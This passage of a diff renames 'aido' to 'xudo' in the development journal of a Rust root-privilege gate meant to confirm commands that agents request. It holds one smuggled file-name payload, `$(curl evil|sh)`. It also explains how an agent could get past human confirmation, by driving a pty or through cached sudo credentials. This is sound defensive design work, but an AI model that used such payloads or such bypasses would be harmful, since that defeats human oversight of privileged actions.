 descriptor was opened could describe a different mount under the same id.
@@ -1800,14 +1800,14 @@ line is a mount nobody looked at, so any malformed line now refuses the whole
 table, as does a table that ends mid-line. Fields are split on spaces before
 the kernel's octal escapes are decoded, so a directory named `a - b` cannot
 move a field; decoding is byte-exact, and a backslash the kernel's escaper did
-not write is kept as written. `aido-sys/tests/mountinfo.rs` renders arbitrary
+not write is kept as written. `xudo-sys/tests/mountinfo.rs` renders arbitrary
 bytes exactly as `show_mountinfo` does and requires them back unchanged, and
 requires that no input can panic the parser.
 
 ### Decisions worth knowing
 
 - **Off Linux, nothing is trusted.** There is no mount table, so the three
-  functions refuse everything on macOS, at `/`, and `aido doctor` there says
+  functions refuse everything on macOS, at `/`, and `xudo doctor` there says
   the mount table cannot be checked. The walk and the judgement are tested on
   every platform through a scripted table (`mounts::fake`); the real `/proc` is
   tested on Linux. macOS has no `O_PATH` either, so its probe is a read-only,
@@ -1829,7 +1829,7 @@ requires that no input can panic the parser.
   and the parser decodes those back. `TrustError::UntrustedMount` keeps the
   decoded bytes for anything that compares them and renders the type and the
   mount point through `escape_ascii`, so an escape sequence, or a newline
-  forging a line of `aido doctor`'s report, reaches the terminal as visible
+  forging a line of `xudo doctor`'s report, reaches the terminal as visible
   text (`a_fuse_subtype_cannot_write_to_the_terminal_that_shows_its_refusal`).
   The component path is rendered as before: it comes from the operator's path,
   or from a listing on a mount that has already passed.
@@ -1872,7 +1872,7 @@ requires that no input can panic the parser.
 4. Strict parsing: a kernel that prints a line this parser does not expect
    refuses every ruleset on that host, loudly, until the parser learns it.
 5. The table is read once per component and once for the rule files, five
-   times for `/etc/aido/rules.d`, rather than once; see above for why it
+   times for `/etc/xudo/rules.d`, rather than once; see above for why it
    cannot be read up front.
 
 ### Still open
@@ -1892,7 +1892,7 @@ requires that no input can panic the parser.
   round trips. Adding one costs a minute of every CI run.
 - `verify_path`, the path-based report, has no mount check; nothing calls it.
 - **A root-made mount of a writable device is accepted.** The design plan
-  refuses `/etc/aido` on a "user-writable mount" (its line 161), and nothing
+  refuses `/etc/xudo` on a "user-writable mount" (its line 161), and nothing
   here checks what backs a mount: a root-made mount of a block device a user
   can write, or of a loop device whose backing file is the user's, passes,
   and that user can rewrite the filesystem under the kernel. mountinfo names
@@ -1901,7 +1901,7 @@ requires that no input can panic the parser.
   `/sys/block/loopN/loop/backing_file`, and walking that file's ownership. A
   block device's own node is `root:disk 0660` on most distributions, so
   "group-writable" cannot be the test. New design; recorded, not built.
-- **`aidod`'s unit must not add `nosuid` or `noexec` to the path to the
+- **`xudod`'s unit must not add `nosuid` or `noexec` to the path to the
   rules** — systemd's `NoExecPaths=` would, for one — or nothing loads. To be
   recorded where the unit is written (step 2).
 - ~~**A user's FUSE daemon can stall the walk.**~~ Closed by the review fix
@@ -1918,7 +1918,7 @@ code and the kernel's own table of `ns` entries.
 
 1. **`open_trusted` refused every path under `/run`.** `nosuid` and `noexec`
    were refused to every caller, and systemd mounts `/run` `nosuid,nodev`: the
-   gate's spool, `/run/aido/req`, would have been refused on every real host
+   gate's spool, `/run/xudo/req`, would have been refused on every real host
    while `just linux-test` passed, Docker's `/run` being a directory on the
    container's root. **Fixed**: a `MountPolicy` — the ruleset readers refuse
    the two marks, `open_trusted` keeps every other refusal and not those.
@@ -1938,7 +1938,7 @@ code and the kernel's own table of `ns` entries.
    reorder described at the top of this entry: `O_PATH`, the mount, then
    `fstat`, and a reopen checked against the probe. Measured in a throwaway
    privileged container on Linux 6.12, `fuse-overlayfs` mounted by uid 1000
-   on a root-owned `/opt/aido` and probed as root, before and after: without
+   on a root-owned `/opt/xudo` and probed as root, before and after: without
    `allow_other` the old walk said "cannot be inspected: Permission denied",
    with it "is owned by uid 1000", and with the daemon stopped by `SIGSTOP` it
    hung until killed; the new walk reported the user's FUSE mount in all
@@ -1953,7 +1953,7 @@ code and the kernel's own table of `ns` entries.
    decision every answer and checks a real procfs `ns` directory answers
    `ENOENT` for an entry it does not list.
 5. **Documentation.** `SECURITY.md` still said rule-file ownership and mode
-   were not verified; it now says what `aido explain` does not check, what the
+   were not verified; it now says what `xudo explain` does not check, what the
    privileged loader does, and what no check covers yet. `mounts.rs` now says
    `/proc/thread-self` needs 3.17, and that a FUSE `user_id` is relative to the
    namespace the mount was made in. The design plan's "user-writable mount"
@@ -1967,7 +1967,7 @@ is clean; `just linux-test` passes on Linux 6.12 (aarch64) as uid 1000, where
 `/proc/sys` opens through `open_trusted` and is refused to
 `read_trusted_dir` for its `nosuid` procfs mount, and `/usr/bin/true` is
 trusted on the overlay root. CI's coverage command, run the same way in
-Docker, measures `mounts.rs`, `trust.rs`, `proc.rs`, and `aido/src/cli.rs` at
+Docker, measures `mounts.rs`, `trust.rs`, `proc.rs`, and `xudo/src/cli.rs` at
 100% on Linux; the only gaps in that container are in files this step does
 not touch and belong to the container, not the code — `probe.rs`'s sudo
 probes (the image has no sudo) and one `PIDFD_GET_INFO` path in `syscall.rs`
@@ -2015,7 +2015,7 @@ now a test. Finding by finding:
    could not be read, because the last `secure_path` sudo reads may be there.
 10. **`--json` is ASCII.** serde_json escapes only C0 controls; U+009B, DEL,
     and U+202E went out raw. Every non-ASCII character is now `\uXXXX` (a
-    surrogate pair above the BMP), in all of aido's JSON. The kernel line, the
+    surrogate pair above the BMP), in all of xudo's JSON. The kernel line, the
     backend's banner and refusal, and the caller-unavailable reason go through
     `term-sanitize` in the prose.
 11. **Fifos and block devices** are judged by their mode bits like files; only
@@ -2024,8 +2024,8 @@ now a test. Finding by finding:
 12. **The empty-report fallback** is `unverified`, not `clean`. It cannot
     trigger (six checks always run), so no test reaches it; it fails closed
     anyway.
-13. **The join-aido text** no longer says the backend asks for a password
-    "every time": aido's own doas rule is `permit persist`, and sudo caches.
+13. **The join-xudo text** no longer says the backend asks for a password
+    "every time": xudo's own doas rule is `permit persist`, and sudo caches.
 14. **`SECURITY.md`** lists what `doctor` neither checks nor lists.
 15. **A test comment** said a directory that vanishes mid-read "is said"; it is
     not, and now the comment says why.
@@ -2220,8 +2220,8 @@ it was fixed.**
   readable sudoers file with one continuation line made the root-`PATH` check
   unverified with "a sudoers file that could not be read ... the stock
   directories were examined instead", and neither was true. A file that was read
-  and has a line aido does not model is now kept apart from one that could not
-  be read: root's `PATH` says "`secure_path` may be set on a line aido does not
+  and has a line xudo does not model is now kept apart from one that could not
+  be read: root's `PATH` says "`secure_path` may be set on a line xudo does not
   model, in a sudoers file it read", counting those files, and the `secure_path`
   it did find is examined and reported as before. A file that could not be read
   keeps its own reason, so the two are separate entries when both apply
@@ -2230,8 +2230,8 @@ it was fixed.**
   `an_unreadable_sudoers_and_an_unmodelled_drop_in_are_both_said_for_root_path`).
 - **The branch was rebased onto the main of the day.** The crate table in
   `CLAUDE.md` was rewritten on main while the step was being finished; the
-  `aido-bin` row keeps the clause about `PATH`, and
-  `crates/aido-tests/tests/crate_inventory.rs` passes against the merged tables.
+  `xudo-bin` row keeps the clause about `PATH`, and
+  `crates/xudo-tests/tests/crate_inventory.rs` passes against the merged tables.
 
 **Review of the sixth round: one major, two minor (2026-10-21), each reproduced
 before it was fixed.**
@@ -2281,7 +2281,7 @@ before it was fixed.**
   changes nothing (`joined.uncertain |=`, a joined line being uncertain from its
   first line already).
 - **The branch was rebased onto the main of the day** (the broker, then a docs
-  commit), keeping main's crate rows and the `aido-bin` clause about `PATH`.
+  commit), keeping main's crate rows and the `xudo-bin` clause about `PATH`.
 
 **Follow-up, plan item D3 (`docs/todo/m2b-finish-plan.md`), not done: ask the
 program instead of re-implementing its lexer.** This is the real fix for the
@@ -2298,20 +2298,20 @@ or the caller lacks the privilege to ask.
 
 ## 2026-10-19 — M2b step 4b: `doctor --json`, `--fix`, and every other path to root
 
-**Why it matters.** aido decides whether one command may run as root, which
+**Why it matters.** xudo decides whether one command may run as root, which
 protects nothing on a host where the same caller already has another way
 there. `SECURITY.md` said so and said `doctor` could not tell you. Now it can,
 within the limits written down below.
 
 **What exists now.**
 
-- **`aido_backend::paths_to_root`, the report, pure.** It asks a `HostView`
+- **`xudo_backend::paths_to_root`, the report, pure.** It asks a `HostView`
   six things — the caller's ids and groups, `lstat`, the contents of a regular
   file, a directory listing, `readlink`, and `access(W_OK)` — each documented
   with the kernel's semantics, so the fake and the real thing answer alike.
   `MemoryHost` is the fake (relative link targets from the link's directory,
   `..` taken physically, unsearchable directories, `ENOTDIR` as missing);
-  `aido_sys::LiveHost` is the real one: `std::fs` and rustix (feature
+  `xudo_sys::LiveHost` is the real one: `std::fs` and rustix (feature
   `process` added, for `getuid`/`getgid`/`getgroups`), unprivileged, reading
   regular files only, opened `O_NONBLOCK | O_NOCTTY` and judged on the
   descriptor, capped at 4 MiB, so a fifo or a device someone left in a
@@ -2320,7 +2320,7 @@ within the limits written down below.
   `unverified`, or `found`, with what was examined, the findings, what could
   not be examined and why, and a note. *Unverified is never clean*: a check
   that met anything it could not read cannot report clean, and the prose says
-  how to see more (`sudo aido doctor`), keeping the unprivileged run for the
+  how to see more (`sudo xudo doctor`), keeping the unprivileged run for the
   checks that only mean something as the user.
   1. Passwordless rules: `NOPASSWD`, `!authenticate`, doas `nopass`, in
      `/etc/sudoers`, `/etc/sudoers-rs`, everything they include (sudo's
@@ -2365,8 +2365,8 @@ within the limits written down below.
   (`denies_a_caller_owned_link_in_a_sticky_directory_steering_a_path_entry`). A
   character device is judged by its owner alone: `/dev/null`,
   which every masked unit names, is `0666` and holds nothing.
-- **`aido doctor --json`** (or `--output json doctor`): a versioned envelope,
-  `schema_version` 1, `snake_case` fields — `aido_version`, `platform`,
+- **`xudo doctor --json`** (or `--output json doctor`): a versioned envelope,
+  `schema_version` 1, `snake_case` fields — `xudo_version`, `platform`,
   `exec_path`, `kernel` (version, attestation mechanism and since, whether the
   agent path is available and why not, resolution, summary), `ruleset` (dir,
   what loaded or why not, the descriptor-verified trust walk), `caller`
@@ -2375,16 +2375,16 @@ within the limits written down below.
   sudo-rs / doas, exe, version, every capability probed with supported and
   required, missing required, refusal), `paths_to_root`, and `proposals`
   (`null` without `--fix`). A refused backend still reports its whole matrix:
-  `aido_backend::detect` is now `identify` then `judge`, and a test pins that
+  `xudo_backend::detect` is now `identify` then `judge`, and a test pins that
   it stays exactly that. Five snapshots pin the envelope and the prose.
 - **The prose keeps every existing line byte for byte** — the differential
   matrix reads them — and adds the report after `exec path`. Every string that
   came from the machine goes through `term-sanitize` and is flagged when
   anything was removed (`denies_a_file_name_that_would_rewrite_the_terminal`).
-- **`PATH` is read once, by `aido-bin`**, and handed in as `aido::Invocation`;
-  the library still reads no environment. `aido::run` takes the invocation,
+- **`PATH` is read once, by `xudo-bin`**, and handed in as `xudo::Invocation`;
+  the library still reads no environment. `xudo::run` takes the invocation,
   and `run_with` takes a `Platform` (ops, probe, host, path) where it took ops
-  and probe. `CLAUDE.md`'s row for `aido-bin` says so.
+  and probe. `CLAUDE.md`'s row for `xudo-bin` says so.
 
 **Decision: `--fix` prints and applies nothing.** Each proposal is an id, a
 title, what accepting it means, and either the exact argv — the backend in
@@ -2393,19 +2393,19 @@ offer to run them, and it does not build a typed confirmation, because:
 
 - a yes read from this process's terminal is one the requesting process tree
   can type: an agent drives a pty as easily as a human does (invariant 3);
-- running `sudo` from inside aido may not ask at all — a cached credential, or
+- running `sudo` from inside xudo may not ask at all — a cached credential, or
   a standing `NOPASSWD` rule, which is exactly what this report finds — so an
-  agent that runs `aido doctor --fix` would make a privilege change no human
+  agent that runs `xudo doctor --fix` would make a privilege change no human
   saw.
 
 Printed, a command is run by a human in a shell they started, where the
 backend asks for their password: on the password path, the password is the
-confirmation. The only grant on offer is the `aido` group, whose every use
+confirmation. The only grant on offer is the `xudo` group, whose every use
 asks for a password; everything else removes a way to root.
 `no_proposal_ever_grants_a_passwordless_path_or_skips_the_backend` holds that
 over a machine with every kind of finding. Phase 3 § 2.1 said `--fix`
 "requires confirmation" for the group grant; this is that confirmation, and
-the deviation is that aido asks for nothing itself.
+the deviation is that xudo asks for nothing itself.
 
 **A printed command is a command someone will paste.** A world-writable
 directory lets anyone name a file `$(curl evil|sh)`. A command is printed only
@@ -2456,9 +2456,9 @@ is why the gate measures there.
    computed then, and `SUDO_UID` is not read, because it is the environment.
    Two runs, as the user and as root, is the documented way; a `--user` option
    is not built.
-4. **`--fix` does not touch aido's own sudoers file.** The snippet's header
-   says to run `aido doctor --fix` instead of editing it; checking
-   `/etc/sudoers.d/aido` against what aido would write, and offering the fix,
+4. **`--fix` does not touch xudo's own sudoers file.** The snippet's header
+   says to run `xudo doctor --fix` instead of editing it; checking
+   `/etc/sudoers.d/xudo` against what xudo would write, and offering the fix,
    needs the executing installer (step 5).
 5. **Phase 3 § 2.2**, the shipped-versus-loaded version of each rule file,
    needs a package to compare against.
@@ -2498,16 +2498,16 @@ from `explain`, but the broker and the gate were about to inherit it.
 **What exists now.**
 
 - **A requirement belongs to the command, not to the name it is asked under.**
-  `aido_policy::evaluate` gathers every action that runs the same program,
+  `xudo_policy::evaluate` gathers every action that runs the same program,
   byte for byte, and accepts the canonical operands, the named one included.
   If any of them is human-only, an enrolled agent is refused; otherwise the
   confirmation is the strictest any of them demands. Because `evaluate` itself
   does this, the gate, which re-decides the action a spool entry names,
   inherits it with no change of its own, and naming a permissive duplicate
   gains nothing (`an_entry_naming_a_permissive_duplicate_still_needs_the_stricter_confirmation`).
-- **`aido_policy::evaluate_command`** asks the same question of a command that
+- **`xudo_policy::evaluate_command`** asks the same question of a command that
   names no action, and replaces `best_match`, so the front-end no longer
-  decides which rule governs a command. **The broker (step 2) and `aido exec`
+  decides which rule governs a command. **The broker (step 2) and `xudo exec`
   (step 3) must call it, or `evaluate` with the named action, and never iterate
   the actions themselves**: a second search is a second chance to get this
   wrong.
@@ -2524,8 +2524,8 @@ from `explain`, but the broker and the gate were about to inherit it.
   cite no action, as before; the trace names every accepting action, and for a
   human-only refusal reached through an overlap it names the rule that
   reserved the command.
-- **`RuleSet::overlaps`** (new module `aido-policy::overlap`) lists every pair
-  of actions that can accept one command, and `aido check` prints it. Each pair
+- **`RuleSet::overlaps`** (new module `xudo-policy::overlap`) lists every pair
+  of actions that can accept one command, and `xudo check` prints it. Each pair
   of positions is intersected by probing: candidate arguments from both
   matchers, tried through the engine's own `Matcher::accepts`. A shared probe
   is a certain meet. No shared probe is *disjoint* only where an argument
@@ -2587,7 +2587,7 @@ and action field is the same.
 
 **Outside the step, needed to run the gate here.**
 `a_rule_file_that_is_a_link_a_directory_or_a_socket_is_refused` bound a socket
-at a path spelled through `crates/aido-sys/../..`, 128 bytes in a git worktree
+at a path spelled through `crates/xudo-sys/../..`, 128 bytes in a git worktree
 against macOS's 104-byte `sun_path`. It now binds the same file by a path
 relative to the package directory. Every worktree hits this.
 
@@ -2648,10 +2648,10 @@ order. It changes which rule is cited, never what is demanded.
 
 ---
 
-## 2026-10-19 — M2b step 1: `aido-sys-raw`, and what review found
+## 2026-10-19 — M2b step 1: `xudo-sys-raw`, and what review found
 
 The workspace's only `unsafe`: four system calls, five blocks (a fifth call and sixth block, `SO_PEERCRED`, followed the same day; see the entry at the end of this file), in a crate of
-their own, reached through a `Syscalls` trait in `aido-sys` with a real
+their own, reached through a `Syscalls` trait in `xudo-sys` with a real
 implementation and a scripted fake.
 
 | Call | Purpose | Kernel |
@@ -2661,8 +2661,8 @@ implementation and a scripted fake.
 | `ioctl(PIDFD_GET_INFO)` | that process's ids, credentials, and cgroup in one call | 6.13 |
 | `execveat(fd, "", AT_EMPTY_PATH)` | exec the descriptor that was validated | 3.19 |
 
-The first version put these in a module, `aido-sys::raw`, lowered the whole of
-`aido-sys` from `forbid` to `deny` to allow it, and guarded the rest with a
+The first version put these in a module, `xudo-sys::raw`, lowered the whole of
+`xudo-sys` from `forbid` to `deny` to allow it, and guarded the rest with a
 test that matched substrings. A five-lens adversarial review (FFI soundness,
 kernel facts against kernel source, enforcement bypass, test adequacy, fit for
 steps 2 and 4) took it apart, and every finding below was checked against
@@ -2671,17 +2671,17 @@ stage failed on infrastructure errors, so nothing here rests on its votes.
 
 **The enforcement was beatable five ways.** `unsafe{`, `#[expect(unsafe_code)]`,
 `#[allow(dead_code, unsafe_code)]`, `#[unsafe(no_mangle)]`, and two blocks on
-one line all passed, as did `unsafe` in `aido-sys/tests/` and in a `build.rs`,
+one line all passed, as did `unsafe` in `xudo-sys/tests/` and in a `build.rs`,
 which inherited the liftable `deny`. Each was proven with a compiling PoC.
-Now: the calls live in the crate `aido-sys-raw`, `aido-sys` forbids `unsafe`
+Now: the calls live in the crate `xudo-sys-raw`, `xudo-sys` forbids `unsafe`
 again, and the compiler confines it. The test that remains,
-`aido-sys-raw/tests/unsafe_budget.rs`, is the backstop: it lexes every Rust file
+`xudo-sys-raw/tests/unsafe_budget.rs`, is the backstop: it lexes every Rust file
 of every workspace member plus `fuzz/` — comments, raw strings, byte and C
 strings, and character literals understood, so text cannot hide code and code
 cannot hide behind text — and fails on any `unsafe` token or lift of
 `unsafe_code` outside `sys.rs`, on `include!` or `#[path]`, on a block count
-other than the published budget, and on any crate but `aido-sys` depending on
-`aido-sys-raw`. The four PoCs that beat the old test all fail the new one.
+other than the published budget, and on any crate but `xudo-sys` depending on
+`xudo-sys-raw`. The four PoCs that beat the old test all fail the new one.
 
 **Five gaps in the tests, each proven by a surviving mutant:** a `close_range`
 that ignored its floor, or stopped at it; an exec of the working directory
@@ -2762,7 +2762,7 @@ Decisions worth knowing before building on it:
   `LISTEN_FDS` to parse.
 
 Measured: 100% on macOS (`just verify`); the whole suite passes on Linux 6.12 in
-Docker as uid 1000 on fresh builds; `aido-sys-raw` compiles for 64-bit Linux
+Docker as uid 1000 on fresh builds; `xudo-sys-raw` compiles for 64-bit Linux
 only, and says so in words on anything else.
 
 ---
@@ -2774,17 +2774,17 @@ built so that the broker and the gate are written against them rather than
 around them.
 
 **Three readers, three chances to disagree.** The front-end computed the
-policy generation itself, in `crates/aido/src/rules.rs`; nothing else did. The
+policy generation itself, in `crates/xudo/src/rules.rs`; nothing else did. The
 broker is about to write a generation into every spool entry and the gate to
 refuse an entry whose generation is not current, so each of them would have
 grown its own copy of the hash and its own idea of which directory entries are
 rule files. Two copies that drift make every request look stale, or worse,
 make two different rulesets look like one. Now there is one function,
-`aido_policy::load_rule_files`, pure, which takes the files as read and owns
+`xudo_policy::load_rule_files`, pure, which takes the files as read and owns
 the selection predicate (`is_rule_file_name`: `<name>.toml`, so a bare `.toml`
 is no longer a rule file to the descriptor-verified reader either), the order
 (byte order of names), the UTF-8 refusals, and the hash. The front-end reads
-by path and calls it; `aido_sys::load_trusted_rules` reads through verified
+by path and calls it; `xudo_sys::load_trusted_rules` reads through verified
 descriptors and calls it. The broker and the gate use the second and compare
 `Generation::id()`, the first eight bytes of the digest.
 
@@ -2793,7 +2793,7 @@ and contents to SHA-256 back to back, so `1.toml` holding `#a2.toml#b` hashed
 the same as `1.toml` holding `#a` beside `2.toml` holding `#b`. Only root can
 write the rules, so this was not an attack, but it was a generation check that
 could pass across a real policy change. The new hash is domain-separated
-(`aido.ruleset.generation.v1`) and length-prefixes every field.
+(`xudo.ruleset.generation.v1`) and length-prefixes every field.
 `two_rulesets_that_concatenate_alike_have_different_generations` pins it, a
 digest of a fixed ruleset is asserted exactly, and
 `the_generation_depends_on_the_files_not_on_their_read_order` joins the
@@ -2801,9 +2801,9 @@ standing properties. The front-end's printed generation changes value once;
 nothing persisted the old one.
 
 **The socket was unreachable as designed.** The design plan's file table put
-`broker.sock` in a `0700` `/run/aido`, a directory no user can traverse, so no
-user could ever have connected. Now `/run/aido` is `0755`, the socket `0660
-root:aido` (the same group the sudoers rule names), and `req/` and `sessions/`
+`broker.sock` in a `0700` `/run/xudo`, a directory no user can traverse, so no
+user could ever have connected. Now `/run/xudo` is `0755`, the socket `0660
+root:xudo` (the same group the sudoers rule names), and `req/` and `sessions/`
 are the `0700` directories. The gate's `SPOOL_DIR` already described `req/` as
 root-owned `0700`, so no code changes.
 
@@ -2847,7 +2847,7 @@ let the sort order of two rule files decide whether anyone is asked. No test
 covers it and `check` does not report it. Harmless today, because nothing
 executes, and the plan's own answer — sudoers-style last-match-wins with
 negation — would make it worse: negation is a way to widen by reordering. The
-fix goes before `aido exec` in M2b: strictest confirmation across every
+fix goes before `xudo exec` in M2b: strictest confirmation across every
 matching action, an overlap report in `check`, and a new standing property,
 *adding a rule never removes a confirmation*.
 
@@ -2865,7 +2865,7 @@ allows. Replaced with the lines that were actually run. The `--help` text named
 a `rule` subcommand that does not exist; it now names the ones that do.
 
 **What held.** All five standing invariants from `CLAUDE.md` exist as property
-tests in `aido-policy/tests/invariants.rs`, plus five more (hints never change
+tests in `xudo-policy/tests/invariants.rs`, plus five more (hints never change
 a verdict; the agent path is never broader than the human path; declared yolo
 never removes a confirmation; every denial is actionable; evaluation never
 panics). No `#[ignore]`d test. A rule with no `args` permits zero arguments.
@@ -2896,9 +2896,9 @@ where the plan and the code had quietly parted, and the plan was wrong each
 time.
 
 **The gate cannot act without the broker, and the broker was a milestone
-later.** `aido-gate::decide` refuses with `NoPendingRequest` unless a
-root-minted entry exists under `/run/aido/req`, and only root can mint one.
-M2 was defined as "complete without any agent concept" with `aidod` in M3, so
+later.** `xudo-gate::decide` refuses with `NoPendingRequest` unless a
+root-minted entry exists under `/run/xudo/req`, and only root can mint one.
+M2 was defined as "complete without any agent concept" with `xudod` in M3, so
 M2 as written could not execute anything. The minting half of the broker is
 now M2b; M3 keeps the confirmation channels. The alternative — the gate reading
 the question from its parent's `/proc/<pid>/cmdline` — was rejected: it would
@@ -2923,14 +2923,14 @@ enforce file modes. So: a copy, a non-root user.
 **The unsafe budget had no contents list.** Checked against rustix 1.1.4:
 `openat2`, `pidfd_open`, `fstatfs`, and `PR_SET_NO_NEW_PRIVS` are safe
 wrappers; `close_range`, `SO_PEERPIDFD`, and `PIDFD_GET_INFO` are absent and
-`execveat` is `unsafe`. `aido-sys::raw` therefore holds exactly those four, and
+`execveat` is `unsafe`. `xudo-sys::raw` therefore holds exactly those four, and
 the claim "no `unsafe` outside `raw`" stays checkable.
 
 Smaller corrections in the same pass: the gate executable gets its own package
-(`aido-gate-bin`) like the other two entry points; phase 3's deliverables
+(`xudo-gate-bin`) like the other two entry points; phase 3's deliverables
 claimed an apt repository that open decision 3 had already deferred; phase 4
-§ 8 (the `ido` ↔ `aido` integration) had no milestone and now splits between
-M2b's `aido exec` and M6; `re.md` still pointed at remote hosts nobody needs;
+§ 8 (the `ido` ↔ `xudo` integration) had no milestone and now splits between
+M2b's `xudo exec` and M6; `re.md` still pointed at remote hosts nobody needs;
 and `design-plan.md` carries a dated deviations block so a reader meets the
 differences before the text that predates them.
 
@@ -2942,22 +2942,22 @@ differences before the text that predates them.
 
 `trust.rs` verified the rules path by `lstat`-ing each component, and the loader
 then read the files by name. Between the two, any component could be swapped.
-`aido doctor` also checked only the *directory*, so a group-writable rule file
+`xudo doctor` also checked only the *directory*, so a group-writable rule file
 inside a root-owned directory was reported trusted. CONCERNS has called this "a
 stated precondition of M2b" since 2026-08-28.
 
-`aido_sys::open_trusted` walks from `/` one component at a time, each opened
+`xudo_sys::open_trusted` walks from `/` one component at a time, each opened
 relative to its parent's descriptor with `O_NOFOLLOW` (and `O_DIRECTORY` for
 ancestors), and runs the existing check on what `fstat` reports for the
-descriptor just opened. `aido_sys::read_trusted_dir` does that for the rules
+descriptor just opened. `xudo_sys::read_trusted_dir` does that for the rules
 directory and then for every `*.toml` file in it, and reads the bytes through
 the same descriptor that was checked. The thing checked is the thing read.
 When an open fails, the component is examined with `fstatat` and no follow, so
 a link is still reported as a link and a file where a directory must be as
 that, rather than as a bare `ELOOP` or `ENOTDIR`.
 
-`aido doctor` reports through it now. The gate must load through it and nothing
-else; the front-end loader still reads by path so `aido explain` works on a
+`xudo doctor` reports through it now. The gate must load through it and nothing
+else; the front-end loader still reads by path so `xudo explain` works on a
 checkout, and says so in its module documentation.
 
 ### How it is tested without root
@@ -3004,7 +3004,7 @@ non-root user. Docker on this machine gives a real kernel for all of them.
 
 `ido` is the queue an agent writes and a human reads. `crates/ido` is the
 library, at 100% lines, regions, and functions with no waivers; `crates/ido-bin`
-is the executable, excluded from coverage like `aido-bin` and tested through
+is the executable, excluded from coverage like `xudo-bin` and tested through
 real processes instead. Every command in `todo/phase-4-ido.md` § 2 exists:
 `queue`, `add`, `list`, `run`, `drop`, `log`, `celebrate`, and the bare picker.
 `willyoumarryme` is the same binary under a second name. Every row of the
@@ -3064,8 +3064,8 @@ without anything checking. Both are fixed; the second is now a real check.
 
 ### Not done
 
-- § 8, the integration with `aido`: denials that queue themselves, and queued
-  entries run through `aido exec`. `aido exec` does not exist yet.
+- § 8, the integration with `xudo`: denials that queue themselves, and queued
+  entries run through `xudo exec`. `xudo exec` does not exist yet.
 - Cloud profiles that come from the environment (`AWS_PROFILE`) are not shown;
   only the ones in the argv are. Showing them means reading the human's
   environment at render time, which the library deliberately does not do.
@@ -3079,31 +3079,31 @@ without anything checking. Both are fixed; the second is now a real check.
 ### The tripwire fired, as designed, and is now a job
 
 `differential compliance (M2)` had been the only red job since `fc878d0`
-pushed `crates/aido-gate`: it exited 1 the moment a gate crate existed, so the
+pushed `crates/xudo-gate`: it exited 1 the moment a gate crate existed, so the
 matrix could not be forgotten. It is now real. `just differential` builds a
-static musl `aido` and `ci/differential/run.sh` drives it in Docker through
+static musl `xudo` and `ci/differential/run.sh` drives it in Docker through
 five rows — Ubuntu 24.04 with sudo, Ubuntu 24.04 with sudo-rs 0.2.2, Ubuntu
 26.04 with sudo-rs 0.2.13, Alpine 3.22 with OpenDoas 6.8.2, and Alpine with no
 escalator at all. Each row pins which backend was found and every capability
 it was probed to have (`expected/<row>.txt`, versions normalized out), feeds
-the snippet aido would write to that backend's own parser, and records the
+the snippet xudo would write to that backend's own parser, and records the
 verdict for nineteen invocations over the shipped rules
 (`expected/verdicts.txt`). Every row must produce that file byte for byte: a
 backend is not a policy input.
 
 What it does not do: execute. The binary has no exec path, and `row.sh` fails
-the moment `aido doctor` stops saying so, because then the comparison that
+the moment `xudo doctor` stops saying so, because then the comparison that
 matters — the same ruleset *executed* through each backend, identical
 outcomes — is due. The tripwire moved from "does a gate crate exist" to "does
 the binary say it can exec", which is the question that actually decides when
-the second half must be written. `aido-tests` stays reserved for that half.
+the second half must be written. `xudo-tests` stays reserved for that half.
 
 ### Two defects, both "is root permitted?" where the question was "does this parse?"
 
 **The OpenDoas probe.** `doas -C <file>` parses a config and exits 0 or 1.
 `doas -C <file> <command>` additionally evaluates whether the *invoking* user
 is permitted and prints `deny`, exit 1, otherwise. The probe passed `/bin/true`
-as a command; the probe rule names group `aido`; root is not in it; so every
+as a command; the probe rule names group `xudo`; root is not in it; so every
 real OpenDoas answered no to every probe, and detection reported it UNUSABLE
 with an empty version. That is the "open, not fixed" item from 2026-08-28,
 explained. No unit test could see it because the fake runner did not model the
@@ -3115,8 +3115,8 @@ persistent credential cache (which OpenDoas has only when built
 `--with-timestamp`).
 
 **The doas install plan's validate step** had the same shape:
-`doas -C {candidate} /usr/libexec/aido/aido-gate-auth`. The installer is root,
-root is not in `aido`, so on a perfectly valid file the step would have printed
+`doas -C {candidate} /usr/libexec/xudo/xudo-gate-auth`. The installer is root,
+root is not in `xudo`, so on a perfectly valid file the step would have printed
 `deny`, exited 1, and — correctly, every non-notice step is fatal — aborted the
 install. The command is gone;
 `the_doas_validation_command_asks_the_parser_only` pins it. `row.sh` takes the
@@ -3159,24 +3159,24 @@ not installed on this machine any more and is not needed.
 Every run on `main` failed from `ec666f5` onward. Neither cause was a code
 defect; both were test infrastructure lying about what it was testing.
 
-### The binary tests were running whatever `aido` happened to be lying around
+### The binary tests were running whatever `xudo` happened to be lying around
 
-`aido-tests/tests/binary.rs` called `Command::cargo_bin("aido")`, but the
-`aido` binary belongs to `aido-bin`. Cargo sets `CARGO_BIN_EXE_aido`, and
+`xudo-tests/tests/binary.rs` called `Command::cargo_bin("xudo")`, but the
+`xudo` binary belongs to `xudo-bin`. Cargo sets `CARGO_BIN_EXE_xudo`, and
 builds the binary at all, only for the integration tests of the package that
-owns it. From `aido-tests`, `assert_cmd` fell back to probing `target/debug/aido`:
+owns it. From `xudo-tests`, `assert_cmd` fell back to probing `target/debug/xudo`:
 
 - **on a clean CI runner** nothing was there, and all nine tests panicked with
-  `` `CARGO_BIN_EXE_aido` is unset ``;
+  `` `CARGO_BIN_EXE_xudo` is unset ``;
 - **on a developer machine** a binary from some earlier `cargo build` usually
   was there, so the tests passed — against a stale build. Deleting it locally
   reproduced the CI failure exactly.
 
 The second is the worse of the two: an exit-code test that asserts an old
 binary proves nothing about the current one. The tests now live in
-`aido-bin/tests/binary.rs`, where Cargo guarantees a fresh build and sets the
-variable. `aido-bin` was already excluded from coverage, so measurement is
-unchanged, and `aido-tests` no longer needs an exclusion. It stays as an empty
+`xudo-bin/tests/binary.rs`, where Cargo guarantees a fresh build and sets the
+variable. `xudo-bin` was already excluded from coverage, so measurement is
+unchanged, and `xudo-tests` no longer needs an exclusion. It stays as an empty
 package reserved for the M2 differential matrix. This also corrects the
 2026-08-27 note below: `cargo_bin` failing "under the coverage harness" was the
 same cross-package problem, not something llvm-cov did.
@@ -3204,7 +3204,7 @@ property tests are back to checking invariants rather than carrying coverage.
 
 ### Heads-up: the differential job will fail on the next push, on purpose
 
-`crates/aido-gate` landed locally in `fc878d0` but was never pushed. The
+`crates/xudo-gate` landed locally in `fc878d0` but was never pushed. The
 `differential compliance (M2)` job exits 1 the moment a gate crate exists, so
 the sudo / sudo-rs / doas matrix cannot be forgotten. That failure is the
 tripwire working, not a regression.
